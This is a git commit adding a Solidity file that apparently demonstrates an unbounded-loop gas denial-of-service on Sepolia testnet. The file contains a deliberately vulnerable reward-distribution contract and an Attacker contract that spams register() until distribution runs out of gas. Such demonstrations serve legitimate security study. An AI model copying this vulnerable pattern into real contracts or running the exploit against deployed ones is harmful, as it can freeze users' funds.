91777239ebe351a02ba936e9e66510d3d0a3b07e
Gobinda Paul <80039050+Gobindapaull@users.noreply.github.com>
2026-07-25 09:18:23 +0530

    Update Unbounded.sol

--- Unbounded/Unbounded.sol
+++ Unbounded/Unbounded.sol
@@ -1,1 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.36;
 
+contract UnboundedContract {
+
+    address[] public users;
+    mapping(address => bool) public registered;
+
+    function register() external {
+        users.push(msg.sender);
+    }
+
+    function distributeRewards() external payable {
+        uint256 share = address(this).balance / users.length;
+        for (uint256 i = 0; i < users.length; i++) {
+            (bool success, ) = users[i].call{value: share}("");
+            require(success, "Transfer failed");
+        }
+    }
+
+    function getUserCount() external view returns (uint256) {
+        return users.length;
+    }
+
+    function deposit() external  payable  {}
+}
+
+// https://sepolia.etherscan.io/address/0x3f18c002d57e7b911a44dd6cc20df216154f52c4
+
+contract Attacker {
+    UnboundedContract public target;
+
+    constructor(UnboundedContract _target) {
+        target = _target;
+    }
+
+    function attack(uint256 iterations) external {
+        for (uint256 i = 0; i < iterations; i++) {
+            target.register();
+        }
+    }
+
+    receive() external payable { }
+}
+
+// https://sepolia.etherscan.io/address/0x175779561cc141f190e9fbfb41ce004033673b0f/advanced
